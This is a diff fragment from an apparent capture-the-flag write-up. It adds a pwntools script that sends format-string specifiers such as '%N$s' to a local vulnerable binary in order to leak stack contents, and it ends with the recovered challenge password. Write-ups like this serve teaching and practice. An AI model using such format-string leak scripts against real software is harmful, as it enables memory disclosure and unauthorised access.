@@ -51,6 +51,31 @@ for i in range(1,50):
     io.sendline(payload)
     print(io.recvall())
 ```
+OR 
+```py
+from pwn import *
+
+# This will automatically get context arch, bits, os etc
+elf = context.binary = ELF('./format_vuln', checksec=False)
+
+# Let's fuzz 100 values
+for i in range(100):
+    try:
+        # Create process (level used to reduce noise)
+        p = process(level='error')
+        # When we see the user prompt '>', format the counter
+        # e.g. %2$s will attempt to print second pointer as string
+        p.sendlineafter(b'> ', '%{}$s'.format(i).encode())
+        # Receive the response
+        result = p.recvuntil(b'> ')
+        # Check for flag
+        # if("flag" in str(result).lower()):
+        print(str(i) + ': ' + str(result))
+        # Exit the process
+        p.close()
+    except EOFError:
+        pass
+```
 ![image](https://github.com/user-attachments/assets/f4d233c0-3c8e-4c11-8d65-ab6f7a144efc)
 
 And After From Hex the password is : Pa$$w0rd_1s_0n_Th3_St4ck
